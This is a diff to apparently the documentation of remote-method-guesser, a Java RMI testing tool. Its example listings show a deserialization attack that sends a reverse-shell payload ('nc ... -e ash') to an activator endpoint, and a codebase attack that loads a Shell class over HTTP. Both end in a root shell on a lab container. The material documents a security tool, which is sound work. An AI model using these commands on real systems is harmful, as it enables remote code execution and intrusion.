@@ -49,7 +49,7 @@ MarshalledObject<? extends Remote> activate(ActivationID id, boolean force) thro
 The following listing shows an example how to perform a deserialization attack on an *activator* endpoint with *remote-method-guesser*:
 
 ```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 serial CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --component act 
+[qtc@devbox ~]$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --component act
 [+] Creating ysoserial payload... done.
 [+]
 [+] Attempting deserialization attack on Activation endpoint...
@@ -57,12 +57,12 @@ The following listing shows an example how to perform a deserialization attack o
 [+] 	Caught IllegalArgumentException during deserialization attack.
 [+] 	Deserialization attack was probably successful :)
 
-[qtc@kali ~]$ nc -vlp 4444
-Ncat: Version 7.91 ( https://nmap.org/ncat )
+[qtc@devbox ~]$ nc -vlp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:41217.
+Ncat: Connection from 172.17.0.2:34393.
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
@@ -73,20 +73,20 @@ the requested operation. The default implementation for the *activation system* 
 *RMI registry*. Therefore, pulling classes from remote is always allowed.
 
 ```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --component act
+[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --component act
 [+] Attempting codebase attack on Activator endpoint...
 [+] Using class Shell with codebase http://172.17.0.1:8000/ during activate call.
 
-[qtc@kali www]$ python3 -m http.server
+[qtc@devbox www]$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.17.0.2 - - [27/Mar/2021 06:31:28] "GET /Shell.class HTTP/1.1" 200 -
+172.17.0.2 - - [03/Dec/2021 19:15:50] "GET /Shell.class HTTP/1.1" 200 -
 
-[qtc@kali ~]$ nc -vlp 4444
-Ncat: Version 7.91 ( https://nmap.org/ncat )
+[qtc@devbox ~]$ nc -vlp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:36110.
+Ncat: Connection from 172.17.0.2:53954.
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
